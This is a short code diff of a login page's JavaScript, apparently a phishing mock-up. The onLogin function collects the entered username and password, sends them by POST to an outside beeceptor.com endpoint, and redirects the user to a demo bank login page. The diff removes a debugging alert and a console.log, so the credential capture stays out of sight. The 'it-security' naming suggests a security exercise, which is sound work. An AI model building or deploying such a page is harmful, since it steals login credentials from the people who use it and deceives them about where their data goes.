@@ -37,7 +37,6 @@
 function onLogin(){
     var uid=document.getElementById("username").value;
     var pwd= document.getElementById("password").value;
-    alert(uid+""+pwd);
     var xhr = new XMLHttpRequest();
     xhr.open("POST", "https://it-security.free.beeceptor.com/my/api/path", true);    
 
@@ -46,7 +45,6 @@ function onLogin(){
     }));
     xhr.onload = function() {
       var data = JSON.parse(this.responseText);
-      console.log(data);
       window.location.href="https://demo.testfire.net/login.jsp"
 }}
 </script>
